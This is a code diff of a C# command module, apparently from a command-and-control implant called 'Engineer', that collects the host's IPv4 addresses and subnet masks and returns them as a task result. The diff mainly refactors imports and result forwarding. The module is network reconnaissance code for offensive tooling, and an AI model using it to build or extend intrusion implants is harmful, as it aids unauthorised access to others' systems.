@@ -1,11 +1,10 @@
-﻿using Engineer.Commands;
-using Engineer.Functions;
-using Engineer.Models;
-using System;
-using System.Collections.Generic;
-using System.Linq;
+﻿using System.Linq;
+using System.Net.NetworkInformation;
+using System.Net.Sockets;
 using System.Text;
 using System.Threading.Tasks;
+using DynamicEngLoading;
+
 
 namespace Engineer.Commands
 {
@@ -16,9 +15,9 @@ namespace Engineer.Commands
         public override async Task Execute(EngineerTask task)
         {
             //get all of the ip addresses and subnet masks
-            var ipAddresses = System.Net.NetworkInformation.NetworkInterface.GetAllNetworkInterfaces()
+            var ipAddresses = NetworkInterface.GetAllNetworkInterfaces()
                 .SelectMany(x => x.GetIPProperties().UnicastAddresses)
-                .Where(x => x.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
+                .Where(x => x.Address.AddressFamily == AddressFamily.InterNetwork)
                 .Select(x => x.Address.ToString() + " " + x.IPv4Mask.ToString())
                 .ToList();
             //use a string builder to build the output one address and mask per line
@@ -27,7 +26,7 @@ namespace Engineer.Commands
             {
                 output.AppendLine(ipAddress);
             }
-            Tasking.FillTaskResults(output.ToString(),task,EngTaskStatus.Complete,TaskResponseType.String);
+            ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(output.ToString(),task,EngTaskStatus.Complete,TaskResponseType.String);
         }
     }
 }
